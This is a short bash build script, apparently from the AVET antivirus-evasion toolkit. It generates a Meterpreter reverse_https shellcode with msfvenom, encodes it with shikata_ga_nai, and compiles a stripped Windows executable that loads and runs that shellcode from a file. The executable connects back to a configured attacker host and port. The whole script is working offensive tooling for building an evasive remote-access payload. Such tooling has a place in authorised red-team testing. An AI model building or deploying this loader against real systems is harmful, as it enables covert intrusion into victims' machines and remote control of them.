#!/bin/bash          
# build the .exe file that loads the payload from a given text file

# Call the generated executable like:
# output.exe thepayload.bin

# print AVET logo
cat banner.txt

# include script containing the compiler var $win32_compiler
# you can edit the compiler in build/global_win32.sh
# or enter $win32_compiler="mycompiler" here
. build/global_win32.sh

# import feature construction interface
. build/feature_construction.sh

# import global default lhost and lport values from build/global_connect_config.sh
. build/global_connect_config.sh

# override connect-back settings here, if necessary
LPORT=$GLOBAL_LPORT
LHOST=$GLOBAL_LHOST

# make meterpreter reverse payload, encoded with shikata_ga_nai
# additionaly to the avet encoder, further encoding should be used
msfvenom -p windows/meterpreter/reverse_https lhost=$LHOST lport=$LPORT -e x86/shikata_ga_nai -b '\x00' -f raw -a x86 --platform Windows > output/thepayload.bin

# set shellcode source
set_payload_source dynamic_from_file

# set decoder and key source
set_decoder none
set_key_source none

# set payload info source
set_payload_info_source none

# set shellcode binding technique
set_payload_execution_method exec_shellcode

# enable debug output
enable_debug_print

# compile to output.exe file
$win32_compiler -o output/output.exe source/avet.c
strip output/output.exe

# cleanup
cleanup_techniques

# Call the generated executable like:
# output.exe thepayload.bin
